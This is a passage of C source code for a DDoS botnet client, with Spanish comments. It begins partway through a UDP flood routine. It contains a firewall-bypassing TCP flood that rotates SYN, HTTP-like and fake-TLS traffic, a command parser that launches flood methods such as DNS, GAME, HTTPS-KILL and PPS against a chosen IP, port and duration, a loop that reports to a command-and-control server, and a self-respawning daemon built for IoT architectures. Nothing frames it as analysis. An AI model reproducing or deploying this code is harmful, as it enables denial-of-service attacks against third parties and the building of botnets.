        if(sleep_time > 0) {
            usleep(sleep_time);
        }
        
        // Estadísticas
        if(packet_count % 10000 == 0) {
            char stats[64];
            snprintf(stats, sizeof(stats), "UDPBYPASS: %ld packets (Mode: %d)", packet_count, mode);
            log_msg(stats);
        }
    }
    
    // Limpieza
    for(int i = 0; i < num_sockets; i++) {
        if(sock_pool[i] >= 0) {
            shutdown(sock_pool[i], SHUT_RDWR);
            close(sock_pool[i]);
        }
    }
    
    char finish_msg[64];
    snprintf(finish_msg, sizeof(finish_msg), "UDPBYPASS finished - %ld packets", packet_count);
    log_msg(finish_msg);
    free(params);
    return NULL;
}

// ========== TCPBYPASS (Bypass TCP firewalls - Mejorado) ==========
void* tcpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    log_msg("TCPBYPASS attack started (Enhanced Firewall Bypass)");
    
    time_t end = time(NULL) + duration;
    
    // Múltiples técnicas de bypass
    int technique = 0;
    time_t last_tech_change = time(NULL);
    
    long connection_count = 0;
    
    while(running && time(NULL) < end) {
        // Cambiar técnica cada 20 segundos
        if(time(NULL) - last_tech_change > 20) {
            technique = rand() % 5;
            last_tech_change = time(NULL);
        }
        
        int batch_size;
        int sleep_time;
        
        switch(technique) {
            case 0: // SYN flood con puertos variables
                batch_size = 400;
                sleep_time = 800;
                break;
            case 1: // Conexiones persistentes con keepalive
                batch_size = 50;
                sleep_time = 2000;
                break;
            case 2: // HTTP-like traffic
                batch_size = 200;
                sleep_time = 1500;
                break;
            case 3: // SSL/TLS simulation
                batch_size = 150;
                sleep_time = 1200;
                break;
            case 4: // Mixed techniques
                batch_size = 250;
                sleep_time = 1000;
                break;
            default:
                batch_size = 200;
                sleep_time = 1000;
                break;
        }
        
        for(int i = 0; i < batch_size; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if(sock < 0) continue;
            
            // Configuración según técnica
            int yes = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
            setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof(yes));
            
            if(technique == 1) { // Persistent connections
                setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &yes, sizeof(yes));
            }
            
            // Puerto fuente según técnica
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            
            if(technique == 0) {
                src_addr.sin_port = htons(32768 + (rand() % 32768));
            } else if(technique == 1) {
                src_addr.sin_port = htons(10000 + (rand() % 40000));
            } else if(technique == 2) {
                src_addr.sin_port = htons(1024 + (rand() % 64512));
            } else if(technique == 3) {
                src_addr.sin_port = htons(49152 + (rand() % 16384));
            } else {
                src_addr.sin_port = htons(20000 + (rand() % 30000));
            }
            
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr));
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            struct sockaddr_in target;
            target.sin_family = AF_INET;
            target.sin_port = htons(port);
            inet_pton(AF_INET, ip, &target.sin_addr);
            
            connect(sock, (struct sockaddr*)&target, sizeof(target));
            
            // Enviar datos según técnica
            if(technique == 2) { // HTTP
                char http_req[256];
                const char* methods[] = {"GET", "POST", "HEAD", "PUT", "OPTIONS"};
                const char* paths[] = {"/", "/index.html", "/api/v1", "/wp-admin", "/login"};
                
                snprintf(http_req, sizeof(http_req),
                        "%s %s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0\r\n"
                        "Accept: */*\r\n"
                        "Connection: keep-alive\r\n\r\n",
                        methods[rand() % 5], paths[rand() % 5], ip);
                
                send(sock, http_req, strlen(http_req), MSG_NOSIGNAL | MSG_DONTWAIT);
            } else if(technique == 3) { // SSL/TLS
                char tls_data[64];
                tls_data[0] = 0x16; // Handshake
                tls_data[1] = 0x03; // Version
                tls_data[2] = 0x01; // TLS 1.0
                for(int j = 3; j < sizeof(tls_data); j++) {
                    tls_data[j] = rand() % 256;
                }
                send(sock, tls_data, sizeof(tls_data), MSG_NOSIGNAL | MSG_DONTWAIT);
            } else if(technique == 4 && rand() % 3 == 0) {
                // Datos mixtos
                char mixed_data[128];
                for(int j = 0; j < sizeof(mixed_data); j++) {
                    if(j % 6 == 0) mixed_data[j] = 0x00;
                    else if(j % 6 == 1) mixed_data[j] = 0x01;
                    else mixed_data[j] = 32 + (rand() % 95);
                }
                send(sock, mixed_data, sizeof(mixed_data), MSG_NOSIGNAL | MSG_DONTWAIT);
            }
            
            // Cierre inteligente
            if(technique == 1 && rand() % 10 != 0) {
                // Mantener abierto (se cerrará en la siguiente iteración si es necesario)
            } else {
                if(rand() % 2 == 0) shutdown(sock, SHUT_RDWR);
                close(sock);
            }
            
            connection_count++;
        }
        
        usleep(sleep_time);
        
        // Estadísticas periódicas
        if(connection_count % 5000 == 0) {
            char stats[64];
            snprintf(stats, sizeof(stats), "TCPBYPASS: %ld connections (Tech: %d)", 
                    connection_count, technique);
            log_msg(stats);
        }
    }
    
    char finish_msg[64];
    snprintf(finish_msg, sizeof(finish_msg), "TCPBYPASS finished - %ld connections", connection_count);
    log_msg(finish_msg);
    free(params);
    return NULL;
}

void handle_command(int sock, char* buffer) {
    log_msg(buffer);
    
    if(strstr(buffer, ".attack")) {
        char* cmd = strstr(buffer, ".attack");
        if(cmd) {
            char method[32], ip[64];
            int port, duration;
            
            int parsed = sscanf(cmd, ".attack %31s %63s %d %d", 
                               method, ip, &port, &duration);
            
            if(parsed == 4) {
                char log[256];
                snprintf(log, sizeof(log), "Attack: %s %s:%d %ds", method, ip, port, duration);
                log_msg(log);
                
                char params[256];
                snprintf(params, sizeof(params), "%s %d %d", ip, port, duration);
                char* params_copy = strdup(params);
                
                if(params_copy) {
                    pthread_t thread;
                    void* (*attack_func)(void*) = NULL;
                    
                    // MAPEAR TODOS LOS MÉTODOS
                    if(strcasecmp(method, "TCP") == 0) {
                        attack_func = tcp_attack;
                    }
                    else if(strcasecmp(method, "UDPHEX") == 0) {
                        attack_func = udphex_attack;
                    }
                    else if(strcasecmp(method, "GAME") == 0) {
                        attack_func = game_attack;
                    }
                    else if(strcasecmp(method, "DNS") == 0) {
                        attack_func = dns_attack;
                    }
                    else if(strcasecmp(method, "HTTPS-KILL") == 0) {
                        attack_func = https_kill;  // Corregido: sin guión
                    }
                    else if(strcasecmp(method, "PPS") == 0) {
                        attack_func = pps_attack;
                    }
                    else if(strcasecmp(method, "UDPBYPASS") == 0) {
                        attack_func = udpbypass_attack;
                    }
                    else if(strcasecmp(method, "TCPBYPASS") == 0) {
                        attack_func = tcpbypass_attack;
                    }
                    
                    if(attack_func) {
                        pthread_create(&thread, NULL, attack_func, params_copy);
                        pthread_detach(thread);
                        log_msg("Attack thread started");
                    } else {
                        free(params_copy);
                        log_msg("Unknown attack method");
                    }
                }
            }
        }
    }
    else if(strstr(buffer, ".stop")) {
        running = 0;
        log_msg("Stop command received");
        sleep(1);
        running = 1;
    }
    else if(strstr(buffer, "PING")) {
        send(sock, "PONG\n", 5, 0);
    }
    else if(strstr(buffer, "BOT_ID")) {
        log_msg("Bot ID assigned");
    }
}

// ========== CONEXIÓN CNC ==========
void run_bot_logic() {
    log_msg("Bot starting...");
    optimize_system();
    srand(time(NULL));
    
    while(running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            sleep(5);
            continue;
        }
        
        // ⏱️ Timeouts según arquitectura
        struct timeval tv;
#if ARCH_POWER > 70  // Arquitecturas rápidas
        tv.tv_sec = 5;
        tv.tv_usec = 0;
#elif ARCH_POWER > 30  // Arquitecturas medias
        tv.tv_sec = 8;
        tv.tv_usec = 0;
#else  // Arquitecturas lentas (MIPS, ARM5)
        tv.tv_sec = 12;
        tv.tv_usec = 0;
#endif
        
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(CNC_PORT);
        inet_pton(AF_INET, CNC_IP, &server.sin_addr);
        
        if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            char err_msg[256];
            snprintf(err_msg, sizeof(err_msg), 
                    "[%s] Connect failed: %s", ARCH_NAME, strerror(errno));
            log_msg(err_msg);
            close(sock);
            
            // Sleep variable según arquitectura
            int reconnect_sleep = 5;
            if(ARCH_POWER < 30) reconnect_sleep = 15;  // MIPS/ARM5 esperan más
            sleep(reconnect_sleep);
            continue;
        }
        
        // Heartbeat
        char heartbeat_msg[64];
        snprintf(heartbeat_msg, sizeof(heartbeat_msg), 
                "HEARTBEAT:%s:%d\n", ARCH_NAME, ARCH_POWER);
        
        log_msg("Connected to CNC");
        send(sock, heartbeat_msg, strlen(heartbeat_msg), MSG_NOSIGNAL);
        
        // Esperar BOT_ID con timeout ajustado
        fd_set read_fds;
        struct timeval timeout;
#if ARCH_POWER > 70
        timeout.tv_sec = 3;
#else
        timeout.tv_sec = 6;  // Más tiempo para hardware lento
#endif
        timeout.tv_usec = 0;
        
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        
        if(select(sock + 1, &read_fds, NULL, NULL, &timeout) > 0) {
            char init_buf[256];
            int n = recv(sock, init_buf, sizeof(init_buf)-1, 0);
            if(n > 0) {
                init_buf[n] = 0;
                if(strstr(init_buf, "BOT_ID")) {
                    char reg_msg[128];
                    snprintf(reg_msg, sizeof(reg_msg), 
                            "[%s] Bot registered (Power: %d%%)", 
                            ARCH_NAME, ARCH_POWER);
                    log_msg(reg_msg);
                }
            }
        }
        
        // Bucle principal
        char buffer[1024];
        time_t last_heartbeat = time(NULL);
        
        // ⏱️ Configurar timeout de recepción dinámico
        tv.tv_sec = 0;
#if ARCH_POWER > 70
        tv.tv_usec = 50000;  // 50ms para rápido
#elif ARCH_POWER > 30
        tv.tv_usec = 100000; // 100ms para medio
#else
        tv.tv_usec = 200000; // 200ms para lento
#endif
        
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        while(running) {
            // 🔄 Heartbeat con intervalo variable según arquitectura
            int heartbeat_interval = 30;  // Default
            
            if(ARCH_POWER > 80) heartbeat_interval = 25;  // Más frecuente si es rápido
            else if(ARCH_POWER < 30) heartbeat_interval = 45; // Menos frecuente si es lento
            
            if(time(NULL) - last_heartbeat > heartbeat_interval) {
                char pong_msg[32];
                snprintf(pong_msg, sizeof(pong_msg), 
                        "PONG:%s:%d\n", ARCH_NAME, (int)time(NULL));
                send(sock, pong_msg, strlen(pong_msg), MSG_NOSIGNAL);
                last_heartbeat = time(NULL);
            }
            
            memset(buffer, 0, sizeof(buffer));
            int n = recv(sock, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
            
            if(n > 0) {
                buffer[n] = 0;
                handle_command(sock, buffer);
            } else if(n == 0) {
                char disc_msg[64];
                snprintf(disc_msg, sizeof(disc_msg), 
                        "[%s] CNC disconnected", ARCH_NAME);
                log_msg(disc_msg);
                break;
            } else if(errno != EAGAIN && errno != EWOULDBLOCK) {
                char err_msg[64];
                snprintf(err_msg, sizeof(err_msg), 
                        "[%s] Receive error: %s", ARCH_NAME, strerror(errno));
                log_msg(err_msg);
                break;
            }
            
            // ⏸️ Sleep dinámico según arquitectura
#if ARCH_POWER > 70
            usleep(50000);   // 50ms para x86_64
#elif ARCH_POWER > 30
            usleep(100000);  // 100ms para ARM7/x86
#else
            usleep(200000);  // 200ms para MIPS/ARM5
#endif
        }
        
        close(sock);
        
        // 🔁 Reconnect sleep dinámico
        int reconnect_delay = 3;
        if(ARCH_POWER < 30) reconnect_delay = 8;  // Más espera para hardware lento
        
        char recon_msg[128];
        snprintf(recon_msg, sizeof(recon_msg), 
                "[%s] Disconnected, reconnecting in %ds...", 
                ARCH_NAME, reconnect_delay);
        log_msg(recon_msg);
        
        sleep(reconnect_delay);
    }
}

// ========== MAIN ==========
int main() {
    if(fork() > 0) return 0;
    setsid();
    
    while(1) {
        log_msg("=== SYSTEM32 BOT STARTED ===");
        
        pid_t pid = fork();
        if(pid == 0) {
            run_bot_logic();
            exit(0);
        } else {
            int status;
            waitpid(pid, &status, 0);
            log_msg("Bot stopped. Restarting in 2 seconds...");
            sleep(2);
        }
    }
    
    return 0;
}